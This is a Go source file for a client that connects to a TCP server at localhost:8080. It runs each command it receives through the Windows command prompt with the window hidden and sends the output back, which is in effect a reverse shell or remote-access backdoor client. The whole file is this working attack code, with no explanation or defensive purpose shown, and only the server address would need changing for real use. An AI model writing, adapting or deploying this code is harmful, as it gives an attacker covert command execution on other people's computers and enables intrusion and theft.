// client.go
package main

import (
    "bufio"
	"bytes"
    "fmt"
    "net"
    "os/exec"
    "strings"
	"syscall"
)

func main() {
	
    conn, err := net.Dial("tcp", "localhost:8080")
    if err != nil {
        fmt.Println("Error connecting to server:", err)
        return
    }
    defer conn.Close()

    fmt.Println("Connected to server")

    go handleServerMessages(conn)

    // Keep the main function running
    select {}
}

func handleServerMessages(conn net.Conn) {
    reader := bufio.NewReader(conn)
    for {
        message, err := reader.ReadString('\n')
        if err != nil {
            fmt.Println("Disconnected from server")
            return
        }

        message = strings.TrimSpace(message)
        fmt.Printf("Received command: %s\n", message)
		if message == "exit" {
			return
		}
        output := executeCommand(message)
        _, err = conn.Write([]byte(output + "\n"))
        if err != nil {
            fmt.Println("Failed to send output:", err)
            return
        }
    }
}

func executeCommand(command string) string {

	cmd := exec.Command("cmd", "/C", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

    // Create pipes for stdout and stderr
    stdoutPipe, err := cmd.StdoutPipe()
    if err != nil {
        return fmt.Sprintf("Error creating stdout pipe: %s", err)
    }

    stderrPipe, err := cmd.StderrPipe()
    if err != nil {
        return fmt.Sprintf("Error creating stderr pipe: %s", err)
    }

    // Start the command
    if err := cmd.Start(); err != nil {
        return fmt.Sprintf("Error starting command: %s", err)
    }

    // Capture stdout and stderr in separate goroutines
    var stdoutBuf, stderrBuf bytes.Buffer
    go func() {
        stdoutBuf.ReadFrom(stdoutPipe)
    }()

    go func() {
        stderrBuf.ReadFrom(stderrPipe)
    }()

    // Wait for the command to finish
    if err := cmd.Wait(); err != nil {
        return fmt.Sprintf("Error waiting for command: %s", err)
    }

    output := stdoutBuf.String()
    stderrOutput := stderrBuf.String()
    if stderrOutput != "" {
        return fmt.Sprintf("Error executing command: %s\n%s", stderrOutput, output)
    }
    return string(output)
}